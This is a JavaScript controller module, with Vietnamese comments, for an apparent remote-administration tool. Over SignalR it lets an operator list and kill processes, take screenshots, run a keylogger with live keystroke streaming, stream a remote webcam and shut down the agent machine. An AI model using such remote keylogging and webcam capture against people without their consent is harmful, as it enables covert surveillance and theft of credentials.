import { CONFIG, state } from './config.js';
import * as Utils from './utils.js';
import * as Views from './views.js';
import { startSignalR, sendCommand } from './network.js';

let previousObjectUrl = null;

// Kiểm tra xem phần tử có tồn tại không trước khi gán
const agentIdDisplay = document.getElementById('agent-id-display');
if (agentIdDisplay) agentIdDisplay.textContent = CONFIG.AGENT_ID;

// --- 1. CÁC HÀM CALLBACK XỬ LÝ DỮ LIỆU (BẮT BUỘC PHẢI CÓ) ---

const originalAttachViewListeners = window.attachViewListeners || function(){};

function handleResponse(data) {
    if (!data) return;

    if (state.currentView === 'applications' && Array.isArray(data.response)) {
        state.globalAppData = data.response;
        sortAndRenderApp();
    } 
    else if (state.currentView === 'processes' && Array.isArray(data.response)) {
        state.globalProcessData = data.response;
        sortAndRenderProcess();
    }
    else if (data.response === 'stopped') {
        if(state.currentView === 'keylogger') {
            const status = document.getElementById('keylogger-status');
            if(status) status.textContent = "Trạng thái: Đã dừng.";
        }
        if(state.currentView === 'applications') {
            sendCommand('app_list');
            setTimeout(() => {
                sendCommand('app_list');
            }, 1000);
        }
        
        // Reset Webcam UI
        if(state.currentView === 'webcam') {
            // 1. Đặt cờ ngưng nhận dữ liệu
            state.webcam.isStreaming = false;

            const vid = document.getElementById('webcam-stream');
            const ph = document.getElementById('webcam-placeholder');
            const stats = document.getElementById('webcam-stats-overlay');
            
            if(vid) { 
                vid.style.display = 'none'; 
                vid.src = ""; // Xóa dữ liệu ảnh cũ
                
                // Thu hồi Blob URL cũ ngay lập tức
                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                    previousObjectUrl = null;
                }
            }
            if(ph) { ph.style.display = 'flex'; ph.innerHTML = '<i class="fas fa-video-slash fa-2x mb-2 text-slate-400"></i><br>Webcam đang tắt'; }
            if(stats) stats.style.display = 'none';
            state.webcam.currentFPS = 0;
        }
    }
    else if (data.response === 'started') {
        if(state.currentView === 'applications') setTimeout(() => sendCommand('app_list'), 500);
        if(state.currentView === 'processes') sendCommand('process_list');
    }
    else if (data.response === 'killed' && state.currentView === 'processes') {
        sendCommand('process_list');
    }
    else if (data.response === 'done' || data.response === 'ok') {
        Utils.showModal("Thông báo", "Thao tác thành công.", null, true);
    }
}

function handleRealtimeUpdate(data) {
    if (state.currentView === 'keylogger' && data.event === 'key_pressed') {
        const logArea = document.getElementById('keylogger-log');
        if (logArea) {
            logArea.value += data.data;
            logArea.scrollTop = logArea.scrollHeight;
        }
    }
}

function handleBinaryStream(imageData, frameSize = 0, senderTicks = 0) {
    const view = state.currentView;
    const nowPerf = performance.now();

    // Xử lý Screenshot
    if (view === 'screenshot' && state.screenshotPending && imageData) {
        const img = document.getElementById('screenshot-image');
        const ph = document.getElementById('screenshot-placeholder');
        if (img) {
            // Screenshot gửi về base64 có header sẵn hoặc raw base64
            img.src = imageData.startsWith('data:') ? imageData : "data:image/jpeg;base64," + imageData;
            img.style.display = 'block';
            if(ph) ph.style.display = 'none';
            document.getElementById('save-screenshot-btn').classList.remove('hidden');
            state.screenshotPending = false;
            Utils.updateStatus("Đã nhận ảnh.", 'success');
        }
    }

    // Xử lý Webcam
    if (view === 'webcam' && imageData) {
        // QUAN TRỌNG: Kiểm tra cờ streaming. Nếu false thì bỏ qua gói tin này.
        if (state.webcam.isStreaming === false) return;

        const cam = state.webcam;
        
        cam.framesReceived++;
        cam.totalDataReceived += frameSize;
        cam.currentFrameSize = frameSize;

        if (nowPerf - cam.lastSampleTime >= CONFIG.SAMPLE_INTERVAL_MS) {
            cam.totalTimeElapsed = nowPerf - cam.lastSampleTime;
            cam.currentFPS = cam.framesReceived / (cam.totalTimeElapsed / 1000);
            updateWebcamStatsDisplay();
            cam.framesReceived = 0;
            cam.lastSampleTime = nowPerf;
        }
        cam.lastFrameTime = nowPerf;

        const video = document.getElementById('webcam-stream');
        const placeholder = document.getElementById('webcam-placeholder');
        
        if (video) {
            if (placeholder) placeholder.style.display = 'none';
            video.style.display = 'block';

            try {
                const base64Data = imageData.replace(/^data:image\/(png|jpeg|webp);base64,/, "");
                const binaryString = atob(base64Data); 
                const len = binaryString.length;
                const bytes = new Uint8Array(len);
                for (let i = 0; i < len; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                const blob = new Blob([bytes], { type: "image/webp" });

                if (previousObjectUrl) {
                    URL.revokeObjectURL(previousObjectUrl);
                }

                const newUrl = URL.createObjectURL(blob);
                video.src = newUrl;
                previousObjectUrl = newUrl;
            } catch (err) {
                console.error("Blob error:", err);
            }
        }
    }
}

function updateWebcamStatsDisplay() {
    const overlay = document.getElementById('webcam-stats-overlay');
    if (!overlay) return;
    
    if (state.webcam.isStatsVisible) {
        const bitrateKBps = (state.webcam.currentFrameSize / 1024) * state.webcam.currentFPS;
        overlay.innerHTML = `
            <div class="text-sm font-mono text-white/90 p-2 space-y-0.5">
                <p>FPS: <span class="font-bold text-green-400">${state.webcam.currentFPS.toFixed(1)}</span></p>
                <p>Ping: <span class="font-bold text-green-400">${state.webcam.currentPing.toFixed(2)}</span></p>
                <p>Rate: <span class="font-bold text-purple-400">${bitrateKBps.toFixed(1)} KB/s</span></p>
                <p>Size: <span class="font-bold text-slate-300">${(state.webcam.currentFrameSize / 1024).toFixed(1)} KB</span></p>
            </div>`;
    } else {
        overlay.innerHTML = `<p class="text-white bg-red-600 text-xs px-2 py-1 rounded font-bold uppercase tracking-widest">LIVE</p>`;
    }
    overlay.style.display = 'block';
}

// --- 2. LOGIC SẮP XẾP ---

window.handleSortProcess = (column) => {
    if (state.currentSort.column === column) {
        state.currentSort.direction = state.currentSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentSort.column = column;
        state.currentSort.direction = (column === 'name') ? 'asc' : 'desc';
    }
    const container = document.getElementById('content-area');
    if(container) {
       container.innerHTML = Views.renderProcessLayout();
       attachViewListeners('processes');
    }
    sortAndRenderProcess();
};

window.handleSortApp = (column) => {
    if (state.currentAppSort.column === column) {
        state.currentAppSort.direction = state.currentAppSort.direction === 'asc' ? 'desc' : 'asc';
    } else {
        state.currentAppSort.column = column;
        state.currentAppSort.direction = 'asc';
    }
    document.getElementById('content-area').innerHTML = Views.renderAppLayout();
    attachViewListeners('applications');
    sortAndRenderApp();
};

function sortAndRenderProcess() {
    if (!state.globalProcessData) return;
    const { column, direction } = state.currentSort;
    const sorted = [...state.globalProcessData].sort((a, b) => {
        let valA, valB;
        if (column === 'pid') { valA = parseInt(a.pid); valB = parseInt(b.pid); }
        else if (column === 'name') { valA = (a.name||'').toLowerCase(); valB = (b.name||'').toLowerCase(); }
        else if (column === 'cpu') { valA = parseFloat(a.cpu?.replace('%','')||0); valB = parseFloat(b.cpu?.replace('%','')||0); }
        else { valA = parseFloat(a.mem?.replace(/[^\d]/g,'')||0); valB = parseFloat(b.mem?.replace(/[^\d]/g,'')||0); }
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateProcessTable(sorted);
}

function sortAndRenderApp() {
    if (!state.globalAppData) return;
    const { column, direction } = state.currentAppSort;
    const sorted = [...state.globalAppData].sort((a, b) => {
        let valA = (a[column] || '').toString().toLowerCase();
        let valB = (b[column] || '').toString().toLowerCase();
        
        if (valA < valB) return direction === 'asc' ? -1 : 1;
        if (valA > valB) return direction === 'asc' ? 1 : -1;
        return 0;
    });
    Views.updateAppTable(sorted);
}

// --- 3. CONTROLLER & EVENTS ---

function switchView(view) {
    state.currentView = view;
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.classList.remove('active');
        if(btn.dataset.view === view) btn.classList.add('active');
    });

    const area = document.getElementById('content-area');
    if (!area) return;
    
    let html = '';
    switch (view) {
        case 'applications': html = Views.renderAppLayout(); setTimeout(() => sendCommand('app_list'), 100); break;
        case 'processes': html = Views.renderProcessLayout(); setTimeout(() => sendCommand('process_list'), 100); break;
        case 'screenshot': html = Views.renderScreenshotView(); break;
        case 'keylogger': html = Views.renderKeyloggerDisplay(); break;
        case 'webcam': html = Views.renderWebcamControl(); break;
        case 'system': html = Views.renderSystemControls(); break;
    }
    
    area.innerHTML = html;
    attachViewListeners(view);
}

function attachViewListeners(view) {
    if (view === 'applications') {
        const btnRefresh = document.getElementById('list-apps-btn');
        if(btnRefresh) btnRefresh.onclick = () => {
            const tbody = document.getElementById('app-list-body');
            if(tbody) tbody.innerHTML = Utils.getLoadingRow(4);
            sendCommand('app_list');
        };
        const btnStart = document.getElementById('start-app-btn');
        if(btnStart) btnStart.onclick = () => {
            const name = document.getElementById('app-start-name').value;
            if(name) sendCommand('app_start', { name });
        };
        
        const tableBody = document.getElementById('app-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const stopBtn = e.target.closest('button[data-action="stop-app"]');
            const startBtn = e.target.closest('button[data-action="start-app"]');
            if (stopBtn) {
                const name = stopBtn.dataset.name || stopBtn.dataset.id;
                Utils.showModal("Dừng App", `Dừng ứng dụng "${name}"?`, () => {
                    stopBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                    sendCommand('app_stop', { name: stopBtn.dataset.id });
                });
            }
            if (startBtn) {
                startBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
                sendCommand('app_start', { name: startBtn.dataset.id });
            }
        });
    }
    else if (view === 'processes') {
        const btnList = document.getElementById('list-processes-btn');
        if(btnList) btnList.onclick = () => {
            document.getElementById('process-list-body').innerHTML = Utils.getLoadingRow(5);
            sendCommand('process_list');
        };
        const btnStart = document.getElementById('start-process-btn');
        if(btnStart) btnStart.onclick = () => {
             const path = prompt("Nhập đường dẫn/tên tiến trình:");
             if(path) sendCommand('process_start', { name: path });
        };
        const tableBody = document.getElementById('process-list-body');
        if(tableBody) tableBody.addEventListener('click', (e) => {
            const btn = e.target.closest('button[data-action="kill-process"]');
            if(btn) {
                const pid = btn.dataset.id;
                Utils.showModal("Kill Process", `PID ${pid}?`, () => sendCommand('process_stop', { pid: parseInt(pid) }));
            }
        });
        document.getElementById('process-search')?.addEventListener('keyup', (e) => {
            const term = e.target.value.toLowerCase();
            document.querySelectorAll('#process-list-body tr').forEach(row => {
                row.style.display = row.innerText.toLowerCase().includes(term) ? '' : 'none';
            });
        });
    }
    else if (view === 'screenshot') {
        document.getElementById('capture-screenshot-btn').onclick = () => {
            const img = document.getElementById('screenshot-image');
            img.style.display = 'none';
            document.getElementById('screenshot-placeholder').textContent = 'Đang chờ ảnh...';
            document.getElementById('screenshot-placeholder').style.display = 'block';
            document.getElementById('save-screenshot-btn').classList.add('hidden');
            state.screenshotPending = true;
            sendCommand('screenshot');
        };
        document.getElementById('save-screenshot-btn').onclick = () => {
            const src = document.getElementById('screenshot-image').src;
            if(src) {
                const link = document.createElement('a');
                link.href = src;
                link.download = `screenshot_${Date.now()}.png`;
                link.click();
            }
        };
    }
    else if (view === 'keylogger') {
        document.getElementById('start-keylogger-btn').onclick = () => {
            sendCommand('keylogger_start');
            document.getElementById('keylogger-status').textContent = "Trạng thái: Đang Ghi...";
        };
        document.getElementById('stop-keylogger-btn').onclick = () => sendCommand('keylogger_stop');
        document.getElementById('clear-keylogger-btn').onclick = () => document.getElementById('keylogger-log').value = '';
    }
    else if (view === 'webcam') {
        document.getElementById('webcam-on-btn').onclick = () => {
            // SỬA: Bật cờ streaming khi nhấn nút Bật
            state.webcam.isStreaming = true;
            sendCommand('webcam_on');
            const ph = document.getElementById('webcam-placeholder');
            if(ph) ph.innerHTML = '<div class="loader mb-2"></div> Đang kết nối...';
            updateWebcamStatsDisplay();
        };
        document.getElementById('webcam-off-btn').onclick = () => sendCommand('webcam_off');
        document.getElementById('toggle-stats-btn').onclick = () => {
            state.webcam.isStatsVisible = !state.webcam.isStatsVisible;
            const btn = document.getElementById('toggle-stats-btn');
            btn.classList.toggle('bg-blue-600', state.webcam.isStatsVisible);
            btn.classList.toggle('text-white', state.webcam.isStatsVisible);
            updateWebcamStatsDisplay();
        };
    }
    else if (view === 'system') {
        document.getElementById('shutdown-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Tắt máy Agent?", () => sendCommand('shutdown'));
        document.getElementById('restart-btn').onclick = () => Utils.showModal("CẢNH BÁO", "Khởi động lại Agent?", () => sendCommand('restart'));
    }
}

// --- INIT ---

function doLogin(username, password) {
    const btnText = document.getElementById('btn-text');
    const btnLoader = document.getElementById('btn-loader');
    const errorMsg = document.getElementById('login-error');
    const loginBtn = document.getElementById('login-btn');
    
    // SỬA LỖI: Xóa dấu phẩy thừa ở đây
    const ipInput = document.getElementById("server-ip").value.trim(); 
    
    // Nếu để trống thì mặc định localhost
    const serverIp = ipInput || "localhost";
    const dynamicUrl = `http://${serverIp}:5000/clienthub`;

    btnText.textContent = "Đang xác thực...";
    btnLoader.classList.remove('hidden');
    errorMsg.classList.add('hidden');
    loginBtn.disabled = true;

    startSignalR(dynamicUrl, username, password, {
        onResponse: handleResponse,
        onUpdate: handleRealtimeUpdate,
        onBinary: handleBinaryStream
    })
    .then((conn) => {
        // SỬA LỖI: Nhận biến conn từ resolve
        state.connection = conn; 
        state.currentUser = username;
        
        const userDisplay = document.getElementById('user-display');
        if(userDisplay) userDisplay.textContent = `Hi, ${username}`;
        
        Utils.updateStatus("Đã kết nối an toàn", "success");
        
        // Lưu IP lại
        localStorage.setItem('saved_server_ip', serverIp);

        const loginScreen = document.getElementById('login-screen');
        const appScreen = document.getElementById('app');

        loginScreen.classList.add('opacity-0');
        setTimeout(() => {
            loginScreen.classList.add('hidden');
            appScreen.classList.remove('hidden');
            setTimeout(() => {
                appScreen.classList.remove('opacity-0');
                switchView(state.currentView);
            }, 50);
        }, 500);
    })
    .catch((err) => {
        console.warn("Login Failed:", err);
        btnText.textContent = "Đăng Nhập";
        btnLoader.classList.add('hidden');
        loginBtn.disabled = false;
        if(errorMsg) {
             errorMsg.textContent = "Lỗi kết nối hoặc sai mật khẩu!";
             errorMsg.classList.remove('hidden');
        }
    });
}

function doLogout() {
    if (state.connection) state.connection.stop();
    location.reload();
}

document.addEventListener('DOMContentLoaded', () => {
    // Bind Tab Click
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => switchView(e.currentTarget.dataset.view));
    });

    // Bind Login
    const loginForm = document.getElementById('login-form');
    if(loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            doLogin(document.getElementById('username-input').value, document.getElementById('password-input').value);
        });
    }

    // Bind Logout
    const logoutBtn = document.getElementById('logout-btn');
    if(logoutBtn) logoutBtn.addEventListener('click', doLogout);
    
    // Tự động điền IP cũ
    const savedIp = localStorage.getItem('saved_server_ip');
    if (savedIp) {
        const ipField = document.getElementById('server-ip');
        if(ipField) ipField.value = savedIp;
    }
});